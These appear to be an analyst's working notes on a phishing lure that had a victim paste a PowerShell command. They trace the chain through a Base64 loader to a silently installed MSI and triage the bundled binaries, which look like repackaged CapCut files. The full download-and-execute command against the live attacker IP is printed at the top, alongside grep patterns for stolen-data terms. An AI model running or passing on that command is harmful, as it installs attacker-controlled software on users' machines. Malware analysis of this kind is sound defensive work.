Target Victim was given the powershell command
'powershell -c "iex(irm '85.239.149.40/FnjVsLKEJb2Jall3wx' -UseBasicParsing)'
with the pretext of validating a facit login.

powershell command breakdown:
powershell -c - starts powershell and executes the following
iex - executes the downloaded content as powershell code
irm - downsoads content from url
85.239.149.40/FnjVsLKEJb2Jall3wx - remote server path

upon curlling the contents we get the payload as payload.txt

examining the payload we see obfuscated powershell in Base64
using Chatgpt we find that the encrypted payload is the variable $PzgEetbY

greping the payload variable we get
$PzgEetbY = $cgvALlSmjK + $uByFkjdxlz + $smqaAwWiWT + $iHOCgAJHgt + $WGyOrcdqEj + $rVQzttuJEU + $uvZglYOnxh + $jaztKoGINU + $AJrNVrcOxY + $YNukYXEIdO + $xKdRFbhMAs + $FVTJeIYLfH + $MmmhVwuTAA + $FbVeacWoKe + $QOrHnQPKci + $IgOtyhoTVD + $nSnbtIIpjG + $KcCLJQXcUJ + $PStotCCOkv + $GytGntCyvh + $PyNkarpjIv + $MoPhAUPqBd + $xCuzeWKCGN + $RdxMwrnqWr + $ZNyxVvAUsa + $tUxeOmCQnp + $AnsQyuGXYI + $JhKeWyaMfU + $NLNGcAtJuG + $SVPkonaCdB + $ggEAQLWNVZ + $dtFcwQQUEi + $gFvutKIoiW + $TwOPNALhRr + $PUSVyRMppL + $xnyRpDOntb
$oGCpCSpU = swKfXyNqUa -z $PzgEetbY

we can now see the other variables used to construct the payload, and we can pull all of the variables out with
grep "^$.\*=" sample.ps1 > vars.txt

now we can reconstruct the string with a python script yielding decoded.ps1
we can see that the powershell decrypts the Base64 block $raw yielding b64payload.txt

we can now see that it pulls the msi UICBDMW.msi from http://85.239.149.40:6600
and executes silently with msiexec.exe

we can now curl the file

file UICBDMW.msi
UICBDMW.msi:
Composite Document File V2 Document,
Little Endian,
Os: Windows,
Version 6.2,
MSI Installer,
Code page: 1252,
Title: Installation Database,
Subject: Sizarship,
Author: Veil Patron,
Keywords: Installer,
Comments: This installer database contains the logic and data required to install Sizarship.,
Template: Intel;1033, Revision Number: {F51A9573-09D5-4FA4-9727-4459F5DC5FB1},
Create Time/Date: Tue May 26 23:06:26 2026,
Last Saved Time/Date: Tue May 26 23:06:26 2026,
Number of Pages: 500,
Number of Words: 10,
Name of Creating Application: WiX Toolset (4.0.0.0),
Security: 2

using 7z to view UICBDMW.msi 

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2026-05-26 15:03:48 .....       228016               P0kk0eAnsGQS
2026-05-26 15:03:48 .....      5529264               GkCaSpXcg95SIo8m
2026-05-26 15:03:48 .....       125104               Y8p1Gq0n7iNF
2026-05-26 15:03:48 .....        54960               S3cwB5EdKcaF4u5M
2026-05-26 15:03:48 .....       273072               t0Mhrk0VAbsv
2026-05-26 15:03:48 .....         9944               Pm7KFbOWP5
2026-05-26 15:03:48 .....      2850992               ICnGNGxT
2026-05-26 15:03:48 .....       438960               viM6fon1J7MG1Wb
2026-05-26 15:03:48 .....       694960               iXzxVqBqNYNtJjOM5gz
2026-05-26 15:03:48 .....       570032               QAZX2o5H
2026-05-26 15:03:48 .....        28336               Ba4sctKCvu
2026-05-26 15:03:48 .....       637880               m7mvr72L
2026-05-26 15:03:48 .....      2279810               US8yBGmyj
2026-05-26 15:03:48 .....      1133624               DEWTud3JSrCytqK
2026-05-26 15:03:48 .....       101552               Oj7QkJVzat8
2026-05-26 15:03:48 .....        41648               hG3vvZDdOfpOjoWGpiXU
------------------- ----- ------------ ------------  ------------------------
2026-05-26 15:03:48           14998154      6602752  16 files

extracting into msi_extracts we see DLL files.

now we search for any obvious payloads with 
strings -a * | grep -Ei "http|https|powershell|cmd\.exe|rundll32|regsvr32|msiexec|schtasks|startup|runonce|appdata|programdata|\.dll|\.exe" | head -200

we see executables such as cmd.exe and other .exe, aswell as .dll files
runtimes such as MSVCP140.dll, VCRUNTIME140.dll 
Qt related strings: Qt6core.dll, qt_start_hook, _q_startupNotification
Networking strings: WSAStartup, http, https
Crypto: libcrypto-1_1-x64.dll, OCSP_REQ_CTX_http 
certificates from DigiCert and Microsoft 
and ticket_appdata

the Qt strings suggest one of the extracted files ay be a Qt-based windows application,
that is bundled with DLLs. and libcrypto and WSAStartup strings suggest netowrk/TLS capability

P0kk0eAnsGQS looks like a GUI executable, most likely the main app 
Y8p1Gq0n7iNF contains lots of CapCut/ByteDance endpoints like:
editor-api-sg.capcut.com, byteoversea.com, and api-heycan-pc-gcp.capcut.com 
GkCaSpXcg95SIo8m, P0kk0eAnsGQS, S3cwB5EdKcaF4u5M, and Y8p1Gq0n7iNF reference Qt6core.dll, 
so most likely a Qt application bundle.
ICnGNGxT, iXzxVqBqNYNtJjOM5gz, and viM6fon1J7MG1Wb look like networking/crypto-related DLLs,
with libcrypto, HTTP/HTTPS, WSA, and curl-like strings. 

so far the delivery chain is 
PowerShell IEX/IRM → obfuscated Base64 loader → hidden PowerShell → silent MSI install → random-named PE files

Lets start with examining the main GUI executable
with strings -a P0kk0eAnsGQS | grep -Ei "appdata|programdata|startup|run|http|https|token|steam|discord|chrome|wallet|cookie|password|login|capcut|byte|powershell|cmd"

yeilding

!This program cannot be run in DOS mode.
user_is_login
C:\.image_jenkins\workspace\CC-Windows-Release\WorkSpace\bin\JYPacket\1.4.0.198\CapCut.pdb
CapCut.exe
??1QByteArray@@QEAA@XZ
?data@QByteArray@@QEAAPEADXZ
?toUtf8@QString@@QEGBA?AVQByteArray@@XZ
g	?castHelper@QByteArrayView@@CAPEBDPEBD@Z
?fromUtf8@QString@@SA?AV1@VQByteArrayView@@@Z
??0QString@@QEAA@AEBVQByteArray@@@Z
??0QVariant@@QEAA@AEBVQByteArray@@@Z
?toJson@QJsonDocument@@QEBA?AVQByteArray@@W4JsonFormat@1@@Z
??AQByteArray@@QEAAAEAD_J@Z
?toHex@QByteArray@@QEBA?AV1@D@Z
?size@QByteArray@@QEBA_JXZ
?fromJson@QJsonDocument@@SA?AV1@AEBVQByteArray@@PEAUQJsonParseError@@@Z
?result@QCryptographicHash@@QEBA?AVQByteArray@@XZ
?toUtf8@QString@@QEHAA?AVQByteArray@@XZ
VCRUNTIME140.dll
VCRUNTIME140_1.dll
api-ms-win-crt-runtime-l1-1-0.dll
   <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
            xmlns:exif="http://ns.adobe.com/exif/1.0/">
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"><dependency><dependentAssembly><assemblyIdentity type="Win32" name="Microsoft.Windows.Common-Controls" version="6.0.0.0" processorArchitecture="*" publicKeyToken="6595b64144ccf1df" language="*"></assemblyIdentity></dependentAssembly></dependency><trustInfo xmlns="urn:schemas-microsoft-com:asm.v3"><security><requestedPrivileges><requestedExecutionLevel level="asInvoker" uiAccess="false"></requestedExecutionLevel></requestedPrivileges></security></trustInfo><compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1"><application><supportedOS Id="{e2011457-1546-43c5-a5fe-008deee3d3f0}"></supportedOS><supportedOS Id="{35138b9a-5d96-4fbd-8e2d-a2440225f93a}"></supportedOS><supportedOS Id="{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}"></supportedOS><supportedOS Id="{1f676c76-80e1-4239-95bb-83d0f6d0da78}"></supportedOS><supportedOS Id="{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}"></supportedOS></application></compatibility></assembly>PADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDING
http://ocsp.digicert.com0I
=http://cacerts.digicert.com/DigiCertHighAssuranceEVRootCA.crt0K
:http://crl3.digicert.com/DigiCertHighAssuranceEVRootCA.crl0
http://ocsp.digicert.com0A
5http://cacerts.digicert.com/DigiCertTrustedRootG4.crt0C
2http://crl3.digicert.com/DigiCertTrustedRootG4.crl0
Bytedance Pte. Ltd.1
Bytedance Pte. Ltd.0
Mhttp://crl3.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0S
Mhttp://crl4.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0=
http://www.digicert.com/CPS0
http://ocsp.digicert.com0\
Phttp://cacerts.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crt0
Ihttp://crl3.digicert.com/DigiCertTrustedG4RSA4096SHA256TimeStampingCA.crl0
http://ocsp.digicert.com0X
Lhttp://cacerts.digicert.com/DigiCertTrustedG4RSA4096SHA256TimeStampingCA.crt0
http://ocsp.digicert.com0A
5http://cacerts.digicert.com/DigiCertTrustedRootG4.crt0C
2http://crl3.digicert.com/DigiCertTrustedRootG4.crl0 
http://ocsp.digicert.com0C
7http://cacerts.digicert.com/DigiCertAssuredIDRootCA.crt0E
4http://crl3.digicert.com/DigiCertAssuredIDRootCA.crl0

using script.py to check the imports for each PE 
==== S3cwB5EdKcaF4u5M ====
Subsystem: 2
EntryPoint: 0x540c
  Qt6Core.dll
  MSVCP140.dll
  VCRUNTIME140.dll
  VCRUNTIME140_1.dll
  api-ms-win-crt-runtime-l1-1-0.dll
  api-ms-win-crt-stdio-l1-1-0.dll
  api-ms-win-crt-heap-l1-1-0.dll
  KERNEL32.dll

==== viM6fon1J7MG1Wb ====
Subsystem: 2
EntryPoint: 0x4cf68
  libcrypto-1_1-x64.dll
  CRYPT32.dll
  WS2_32.dll
  WLDAP32.dll
  libssl-1_1-x64.dll
  KERNEL32.dll
  VCRUNTIME140.dll
  api-ms-win-crt-runtime-l1-1-0.dll
  api-ms-win-crt-string-l1-1-0.dll
  api-ms-win-crt-convert-l1-1-0.dll
  api-ms-win-crt-stdio-l1-1-0.dll
  api-ms-win-crt-time-l1-1-0.dll
  api-ms-win-crt-utility-l1-1-0.dll
  api-ms-win-crt-filesystem-l1-1-0.dll
  api-ms-win-crt-heap-l1-1-0.dll

==== GkCaSpXcg95SIo8m ====
Subsystem: 2
EntryPoint: 0x2fc6d0
  MPR.dll
  USERENV.dll
  ADVAPI32.dll
  KERNEL32.dll
  NETAPI32.dll
  ole32.dll
  SHELL32.dll
  USER32.dll
  VERSION.dll
  WINMM.dll
  WS2_32.dll
  PSAPI.DLL
  MSVCP140.dll
  MSVCP140_1.dll
  VCRUNTIME140.dll
  VCRUNTIME140_1.dll
  api-ms-win-crt-runtime-l1-1-0.dll
  api-ms-win-crt-heap-l1-1-0.dll
  api-ms-win-crt-environment-l1-1-0.dll
  api-ms-win-crt-stdio-l1-1-0.dll
  api-ms-win-crt-time-l1-1-0.dll
  api-ms-win-crt-string-l1-1-0.dll
  api-ms-win-crt-math-l1-1-0.dll
  api-ms-win-crt-utility-l1-1-0.dll
  api-ms-win-crt-filesystem-l1-1-0.dll
  api-ms-win-crt-convert-l1-1-0.dll

==== iXzxVqBqNYNtJjOM5gz ====
Subsystem: 2
EntryPoint: 0x2518
  libcrypto-1_1-x64.dll
  KERNEL32.dll
  VCRUNTIME140.dll
  api-ms-win-crt-time-l1-1-0.dll
  api-ms-win-crt-string-l1-1-0.dll
  api-ms-win-crt-utility-l1-1-0.dll
  api-ms-win-crt-runtime-l1-1-0.dll
  api-ms-win-crt-convert-l1-1-0.dll
  api-ms-win-crt-stdio-l1-1-0.dll

==== Y8p1Gq0n7iNF ====
Subsystem: 2
EntryPoint: 0xef6c
  Qt6Core.dll
  KERNEL32.dll
  MSVCP140.dll
  VCRUNTIME140.dll
  VCRUNTIME140_1.dll
  api-ms-win-crt-convert-l1-1-0.dll
  api-ms-win-crt-runtime-l1-1-0.dll
  api-ms-win-crt-heap-l1-1-0.dll

==== m7mvr72L ====
Subsystem: 3
EntryPoint: 0x12440
  api-ms-win-crt-string-l1-1-0.dll
  api-ms-win-crt-locale-l1-1-0.dll
  api-ms-win-crt-runtime-l1-1-0.dll
  api-ms-win-crt-private-l1-1-0.dll
  api-ms-win-core-synch-l1-1-0.dll
  api-ms-win-core-file-l1-1-0.dll
  api-ms-win-core-file-l1-2-0.dll
  api-ms-win-core-file-l2-1-0.dll
  api-ms-win-core-string-l1-1-0.dll
  api-ms-win-core-errorhandling-l1-1-0.dll
  api-ms-win-core-handle-l1-1-0.dll
  api-ms-win-core-util-l1-1-0.dll
  api-ms-win-core-heap-obsolete-l1-1-0.dll
  api-ms-win-core-localization-l1-2-0.dll
  api-ms-win-core-synch-l1-2-0.dll
  api-ms-win-core-rtlsupport-l1-1-0.dll
  api-ms-win-core-processthreads-l1-1-0.dll
  api-ms-win-core-sysinfo-l1-2-0.dll
  api-ms-win-core-processthreads-l1-1-1.dll
  api-ms-win-core-threadpool-l1-2-0.dll
  api-ms-win-core-libraryloader-l1-1-0.dll
  api-ms-win-core-profile-l1-1-0.dll
  api-ms-win-core-sysinfo-l1-1-0.dll
  api-ms-win-core-interlocked-l1-1-0.dll
  api-ms-win-core-debug-l1-1-0.dll
  api-ms-win-core-delayload-l1-1-0.dll
  api-ms-win-core-delayload-l1-1-1.dll

==== Ba4sctKCvu ====
Subsystem: 3
EntryPoint: 0x15c0
  MSVCP140.dll
  VCRUNTIME140.dll
  api-ms-win-crt-heap-l1-1-0.dll
  api-ms-win-crt-runtime-l1-1-0.dll
  KERNEL32.dll

==== P0kk0eAnsGQS ====
Subsystem: 2
EntryPoint: 0x1d83c
  VESafeGuard.dll
  VECrashMonitor.dll
  VEConfig.dll
  libcurl.dll
  Qt6Core.dll
  KERNEL32.dll
  MSVCP140.dll
  VCRUNTIME140.dll
  VCRUNTIME140_1.dll
  api-ms-win-crt-runtime-l1-1-0.dll
  api-ms-win-crt-heap-l1-1-0.dll
  api-ms-win-crt-stdio-l1-1-0.dll
  api-ms-win-crt-string-l1-1-0.dll
  api-ms-win-crt-math-l1-1-0.dll
  api-ms-win-crt-locale-l1-1-0.dll

==== QAZX2o5H ====
Subsystem: 3
EntryPoint: 0x52990
  VCRUNTIME140.dll
  VCRUNTIME140_1.dll
  api-ms-win-crt-heap-l1-1-0.dll
  api-ms-win-crt-runtime-l1-1-0.dll
  api-ms-win-crt-string-l1-1-0.dll
  api-ms-win-crt-locale-l1-1-0.dll
  api-ms-win-crt-stdio-l1-1-0.dll
  api-ms-win-crt-filesystem-l1-1-0.dll
  api-ms-win-crt-time-l1-1-0.dll
  api-ms-win-crt-environment-l1-1-0.dll
  api-ms-win-crt-math-l1-1-0.dll
  api-ms-win-crt-convert-l1-1-0.dll
  api-ms-win-crt-utility-l1-1-0.dll
  KERNEL32.dll

==== t0Mhrk0VAbsv ====
Subsystem: 2
EntryPoint: 0x14f9c
  ntdll.dll
  KERNEL32.dll
  dbghelp.dll

==== DEWTud3JSrCytqK ====
Subsystem: 3
EntryPoint: 0x17560
  api-ms-win-core-errorhandling-l1-1-0.dll
  api-ms-win-core-heap-l1-1-0.dll
  api-ms-win-core-processthreads-l1-1-0.dll
  api-ms-win-core-libraryloader-l1-1-0.dll
  api-ms-win-core-synch-l1-1-0.dll
  api-ms-win-core-debug-l1-1-0.dll
  api-ms-win-core-processenvironment-l1-1-0.dll
  api-ms-win-core-file-l1-1-0.dll
  api-ms-win-core-string-l1-1-0.dll
  api-ms-win-core-fibers-l1-1-0.dll
  api-ms-win-core-file-l1-2-0.dll
  api-ms-win-core-localization-l1-2-0.dll
  api-ms-win-core-datetime-l1-1-0.dll
  api-ms-win-core-sysinfo-l1-1-0.dll
  api-ms-win-core-rtlsupport-l1-1-0.dll
  api-ms-win-core-processthreads-l1-1-1.dll
  api-ms-win-core-console-l1-1-0.dll
  api-ms-win-core-handle-l1-1-0.dll
  api-ms-win-core-namedpipe-l1-1-0.dll
  api-ms-win-core-timezone-l1-1-0.dll
  api-ms-win-core-file-l2-1-0.dll
  api-ms-win-core-synch-l1-2-0.dll
  api-ms-win-core-profile-l1-1-0.dll
  api-ms-win-core-memory-l1-1-0.dll
  api-ms-win-core-util-l1-1-0.dll
  api-ms-win-core-interlocked-l1-1-0.dll

==== ICnGNGxT ====
Subsystem: 2
EntryPoint: 0x70db
  WS2_32.dll
  ADVAPI32.dll
  USER32.dll
  bcrypt.dll
  KERNEL32.dll
  VCRUNTIME140.dll
  api-ms-win-crt-stdio-l1-1-0.dll
  api-ms-win-crt-convert-l1-1-0.dll
  api-ms-win-crt-string-l1-1-0.dll
  api-ms-win-crt-time-l1-1-0.dll
  api-ms-win-crt-utility-l1-1-0.dll
  api-ms-win-crt-runtime-l1-1-0.dll
  api-ms-win-crt-filesystem-l1-1-0.dll
  api-ms-win-crt-heap-l1-1-0.dll
  api-ms-win-crt-environment-l1-1-0.dll

==== Oj7QkJVzat8 ====
Subsystem: 3
EntryPoint: 0xfb70
  api-ms-win-crt-runtime-l1-1-0.dll
  api-ms-win-crt-heap-l1-1-0.dll
  api-ms-win-crt-string-l1-1-0.dll
  api-ms-win-crt-stdio-l1-1-0.dll
  api-ms-win-crt-convert-l1-1-0.dll
  KERNEL32.dll

==== hG3vvZDdOfpOjoWGpiXU ====
Subsystem: 3
EntryPoint: 0x4160
  api-ms-win-crt-runtime-l1-1-0.dll
  api-ms-win-crt-heap-l1-1-0.dll
  api-ms-win-crt-string-l1-1-0.dll
  VCRUNTIME140.dll
  KERNEL32.dll


this hints at:
P0kk0eAnsGQS being main GUI EXE
GkCaSpXcg95SIo8m being Qt6core.dll 
Y8p1Gq0n7iNF being CapCut/VEConfig-related DLL 
ICnGNGxT / iXzxVqBqNYNtJjOM5gz being crypto related dlls
t0Mhrk0VAbsv being crash/debug related dll, because it imports dbghelp.dll 

from P0kk0eAnsGQS:
VESafeGuard.dll
VECrashMonitor.dll
VEConfig.dll
libcurl.dll
Qt6Core.dll

looks like its from CapCut/ByteDance

now we'll use pefile to check for embedded signatures instead:

python - <<'PY'
import os
import pefile

for f in os.listdir("."):
    try:
        pe = pefile.PE(f)
        secdir = pe.OPTIONAL_HEADER.DATA_DIRECTORY[
            pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_SECURITY"]
        ]
        print(f"{f}: cert_table_va={hex(secdir.VirtualAddress)} size={secdir.Size}")
    except Exception:
        pass
PY

If size is 0, the file has no embedded Authenticode signature. If it has a nonzero size, it has a certificate table.

S3cwB5EdKcaF4u5M: cert_table_va=0xa200 size=13488
viM6fon1J7MG1Wb: cert_table_va=0x67e00 size=13488
GkCaSpXcg95SIo8m: cert_table_va=0x542a00 size=13488
iXzxVqBqNYNtJjOM5gz: cert_table_va=0xa6600 size=13488
Y8p1Gq0n7iNF: cert_table_va=0x1b400 size=13488
m7mvr72L: cert_table_va=0x98000 size=15288
Ba4sctKCvu: cert_table_va=0x3a00 size=13488
P0kk0eAnsGQS: cert_table_va=0x34600 size=13488
QAZX2o5H: cert_table_va=0x87e00 size=13488
t0Mhrk0VAbsv: cert_table_va=0x3f600 size=13488
DEWTud3JSrCytqK: cert_table_va=0x110000 size=19512
ICnGNGxT: cert_table_va=0x2b4c00 size=13488
Oj7QkJVzat8: cert_table_va=0x15800 size=13488
hG3vvZDdOfpOjoWGpiXU: cert_table_va=0x6e00 size=13488

next we map randoms names to real DLL names with 
for f in *; do
  echo "==== $f ===="
  strings -a "$f" | grep -Ei "OriginalFilename|InternalName|ProductName|FileDescription|CompanyName|CapCut|ByteDance|VEConfig|VESafeGuard|VECrashMonitor|libcurl|Qt6Core" | head -80
done

==== Ba4sctKCvu ====
Bytedance Pte. Ltd.1
Bytedance Pte. Ltd.0
==== DEWTud3JSrCytqK ====
==== GkCaSpXcg95SIo8m ====
C:\20072\Qt6\Src\qtbase\bin\Qt6Core.pdb
Qt6Core.dll
?prettyProductName@QSysInfo@@SA?AVQString@@XZ
Bytedance Pte. Ltd.1
Bytedance Pte. Ltd.0
==== hashes.txt ====
==== hG3vvZDdOfpOjoWGpiXU ====
Bytedance Pte. Ltd.1
Bytedance Pte. Ltd.0
==== ICnGNGxT ====
ENGINESDIR: "D:\libCurlBuild\openssl-1.1.1g\install\lib\engines-1_1"
D:\libCurlBuild\openssl-1.1.1g\install\lib\engines-1_1
D:\libCurlBuild\openssl-1.1.1g\libcrypto-1_1-x64.pdb
Bytedance Pte. Ltd.1
Bytedance Pte. Ltd.0
==== iXzxVqBqNYNtJjOM5gz ====
d:\libcurlbuild\openssl-1.1.1g\ssl\packet_local.h
D:\libCurlBuild\openssl-1.1.1g\libssl-1_1-x64.pdb
Bytedance Pte. Ltd.1
Bytedance Pte. Ltd.0
==== m7mvr72L ====
==== Oj7QkJVzat8 ====
Bytedance Pte. Ltd.1
Bytedance Pte. Ltd.0
==== P0kk0eAnsGQS ====
C:\.image_jenkins\workspace\CC-Windows-Release\WorkSpace\bin\JYPacket\1.4.0.198\CapCut.pdb
CapCut.exe
VESafeGuard.dll
VECrashMonitor.dll
?getCrashPath@path@VEConfig@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@XZ
?getVEHelperPath@path@VEConfig@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@XZ
?getVECrashHandlerPath@path@VEConfig@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@XZ
?VERSION@product@VEConfig@@3QEBDEB
?GRAYVER@product@VEConfig@@3QEBDEB
?BUILDNUMBER@product@VEConfig@@3_KB
?getConfigPath@path@VEConfig@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@XZ
?ENV_CFG@pluginUpdate@VEConfig@@3QEBDEB
VEConfig.dll
libcurl.dll
Qt6Core.dll
Bytedance Pte. Ltd.1
Bytedance Pte. Ltd.0
==== Pm7KFbOWP5 ====
==== QAZX2o5H ====
Bytedance Pte. Ltd.1
Bytedance Pte. Ltd.0
==== S3cwB5EdKcaF4u5M ====
HKEY_CURRENT_USER\SOFTWARE\Bytedance\CapCut\dump
C:\.image_jenkins\workspace\CC-Windows-Release\WorkSpace\bin\JYPacket\1.4.0.198\VECrashMonitor.pdb
VECrashMonitor.dll
??4VECrashMonitor@@QEAAAEAV0@$$QEAV0@@Z
??4VECrashMonitor@@QEAAAEAV0@AEBV0@@Z
?startMonitor@VECrashMonitor@@SAXPEBD00_K00000000@Z
?uploadLog@VECrashMonitor@@SAXXZ
Qt6Core.dll
Bytedance Pte. Ltd.1
Bytedance Pte. Ltd.0
==== script.py ====
==== t0Mhrk0VAbsv ====
inject_check_enainject_black_moda\Config\lv_safeinject_module_blsign_check_enablprivacy_check_en\Capcut\User Datd
C:\.image_jenkins\workspace\CC-Windows-Release\WorkSpace\bin\JYPacket\1.4.0.198\VESafeGuard.pdb
VESafeGuard.dll
Bytedance Pte. Ltd.1
Bytedance Pte. Ltd.0
==== US8yBGmyj ====
==== viM6fon1J7MG1Wb ====
Unrecognized content encoding type. libcurl understands %s content encodings.
# This file was generated by libcurl! Edit at your own risk.
# Fatal libcurl error
CLIENT libcurl 7.72.0
CLIENT libcurl 7.72.0
CLIENT libcurl 7.72.0
A requested feature, protocol or option was not found built-in in this libcurl due to a build-time decision.
A libcurl function was given a bad argument
An unknown option was passed in to libcurl
Protocol "%s" not supported or disabled in libcurl
Unsupported proxy '%s', libcurl is built without the HTTPS-proxy support.
libcurl/7.72.0
libcurl is now using a weak random seed!
d:\libcurlbuild\curl-7.72.0\lib\vtls\openssl.c
D:\libCurlBuild\curl-7.72.0\build\Win64\VC15\DLL Release - DLL OpenSSL\libcurl.pdb
libcurl.dll
Bytedance Pte. Ltd.1
Bytedance Pte. Ltd.0
==== Y8p1Gq0n7iNF ====
capcut
https://editor-api-sg.capcut.com
https://editor-api-sg.capcut.com/service/2/desktop/device_register/
https://editor-api-sg.capcut.com/service/2/app_alert_check/
https://editor-api-sg.capcut.com/lv/v1/get_collections
https://editor-api-sg.capcut.com/lv/v1/get_music_effect_collections
https://editor-api-sg.capcut.com/lv/v1/get_collection_songs
https://editor-api-sg.capcut.com/lv/v1/search_songs
https://editor-api-sg.capcut.com/lv/v1/effect/search
https://editor-api-sg.capcut.com/lv/v1/get_my_tiktok_songs
https://editor-api-sg.capcut.com/lv/v1/get_region
https://editor-api-sg.capcut.com/feedback/2/post_message/
https://editor-api-sg.capcut.com/service/settings/v3/
https://api-heycan-pc-gcp.capcut.com
SOFTWARE\ByteDance\
 2023 ByteDance Pte. Ltd.
Bytedance
capcut.com
CapCut
capcutpc_msstore
C:\.image_jenkins\workspace\CC-Windows-Release\WorkSpace\bin\JYPacket\1.4.0.198\VEConfig.pdb
VEConfig.dll
?AC@artistEffectPlaform@VEConfig@@3QEBDEB
?ACCESS_KEY@effectPlatfrom@VEConfig@@3QEBDEB
?ACCOUNT_CANCEL_GUIDE1@host@VEConfig@@3QEBDEB
?ACCOUNT_CANCEL_GUIDE2@host@VEConfig@@3QEBDEB
?AID@deviceRegister@VEConfig@@3_KB
?APP_GRAYVER@deviceRegister@VEConfig@@3QEBDEB
?APP_ID@artistEffectPlaform@VEConfig@@3QEBDEB
?APP_ID@effectPlatfrom@VEConfig@@3QEBDEB
?APP_ID@product@VEConfig@@3QEBDEB
?APP_NAME@artistEffectPlaform@VEConfig@@3QEBDEB
?APP_NAME@deviceRegister@VEConfig@@3QEBDEB
?APP_SETTINGS@host@VEConfig@@3QEBDEB
?APP_SOURCE@product@VEConfig@@3QEBDEB
?APP_VERSION@deviceRegister@VEConfig@@3QEBDEB
?APP_VERSION@effectPlatfrom@VEConfig@@3QEBDEB
?ARTIST_EFFECT_PLATFORM@host@VEConfig@@3QEBDEB
?AUDIO_COLLECTIONS_HOST@host@VEConfig@@3QEBDEB
?AUDIO_SEARCH_HOST@host@VEConfig@@3QEBDEB
?BRAND_FILE_DOWNLOAD_DOMAIN@host@VEConfig@@3QEBDEB
?BRAND_IMAGE_DOWNLOAD_DOMAIN@host@VEConfig@@3QEBDEB
?BRAND_MEDIA_DOWNLOAD_DOMAIN@host@VEConfig@@3QEBDEB
?BUILDNUMBER@product@VEConfig@@3_KB
?BURIED_POINT_POST@host@VEConfig@@3QEBDEB
?BURIED_POINT_POST_ET@host@VEConfig@@3QEBDEB
?CACHE_DIR@effectPlatfrom@VEConfig@@3QEBDEB
?CHECK_SOUND_COPYRIGHT_HOST@host@VEConfig@@3QEBDEB
?CLIENT_ID_QUERY@host@VEConfig@@3QEBDEB
?CLOUD_DRAFT_DOWNLOAD_DOMAIN@host@VEConfig@@3QEBDEB
?CLOUD_DRAFT_UPLOAD_DOMAIN@host@VEConfig@@3QEBDEB
?COMMERCE_HOST@host@VEConfig@@3QEBDEB
?COMMERCE_HOST_BOE@host@VEConfig@@3QEBDEB
?CONFIG_CUSTOM_PARAM@pluginUpdate@VEConfig@@3QEBDEB
?CONFIG_NAME@pluginUpdate@VEConfig@@3QEBDEB
?COPYRIGHT@product@VEConfig@@3QEBDEB
?DEFAULT_FONT@host@VEConfig@@3QEBDEB
?DEFAULT_SUBTITLE_PARAME@host@VEConfig@@3QEBDEB
?DEFAULT_WEB_PLAYER@host@VEConfig@@3QEBDEB
?DEVICEREGISTER_CHANNEL@host@VEConfig@@3QEBDEB
?DEVICETYPE@artistEffectPlaform@VEConfig@@3QEBDEB
?DEVICE_ACTIVE@deviceRegister@VEConfig@@3QEBDEB
?DEVICE_ACTIVE@host@VEConfig@@3QEBDEB
?DEVICE_BRAND@artistEffectPlaform@VEConfig@@3QEBDEB
?DEVICE_ID@artistEffectPlaform@VEConfig@@3QEBDEB
?DEVICE_PLATFORM@artistEffectPlaform@VEConfig@@3QEBDEB
?DEVICE_REGISTER@deviceRegister@VEConfig@@3QEBDEB
?DEVICE_REGISTER@host@VEConfig@@3QEBDEB
?DOUYINMARK_SONGS_LIST_HOST@host@VEConfig@@3QEBDEB
?DOUYIN_SHARE@host@VEConfig@@3QEBDEB
?DRAFTJOSN@product@VEConfig@@3QEBDEB
?EFFECTPLATFORM@host@VEConfig@@3QEBDEB
?EFFECTPLATFORM_BOE@host@VEConfig@@3QEBDEB
?EFFECTPLATFORM_CHANNEL@host@VEConfig@@3QEBDEB
?EFFECT_CloudHost@host@VEConfig@@3QEBDEB
?ENV_CFG@pluginUpdate@VEConfig@@3QEBDEB
?EXPORT_UPLOAD@host@VEConfig@@3QEBDEB
?FEEDBACK_FILE_UPLOAD@host@VEConfig@@3QEBDEB
?FEEDBACK_SERVER_COMMIT@host@VEConfig@@3QEBDEB
?FEISHU_DOCX@host@VEConfig@@3QEBDEB

Y8p1Gq0n7iNF looks like VEConfig.dll, becuase it contains lots of CapCut config API strings and CapCut domains 
such as editor-api-sg.capcut.com, api-heycan-pc-gcp.capcut.com 

S3cwB5EdKcaF4u5M looks like VECrashMonitor.dll 
t0Mhrk0VAbsv looks like VESafeGuard.dll 
viM6fon1J7MG1Wb looks like libcurl.dll 
GkCaSpXcg95SIo8m looks like Qt6core.dll 

also all the PE files seem to have a certificate table, which means they contain embedded authenticode signature data.
Which could mean this is a repackaged CapCut installer 

we'll check out the MSI tables next, to see what gets installed, renamed, and executed

7z x UICBDMW.msi -omsi_full
find msi_full -maxdepth 2 -type f -exec file {} \;

7-Zip 26.01 (x64) : Copyright (c) 1999-2026 Igor Pavlov : 2026-04-27
 64-bit locale=en_US.UTF-8 Threads:8 OPEN_MAX:4096, ASM

Scanning the drive for archives:
1 file, 6602752 bytes (6448 KiB)

Extracting archive: UICBDMW.msi
--          
Path = UICBDMW.msi
Type = Compound
Physical Size = 6602752
Extension = msi
Cluster Size = 4096
----
Path = cab1.cab
Size = 6561805
Packed Size = 6565888
--
Path = cab1.cab
Type = Cab
Physical Size = 6561805
Method = LZX:18
Blocks = 1
Volumes = 1
Volume Index = 0
ID = 0

Everything is Ok

Files: 16
Size:       14998154
Compressed: 6602752
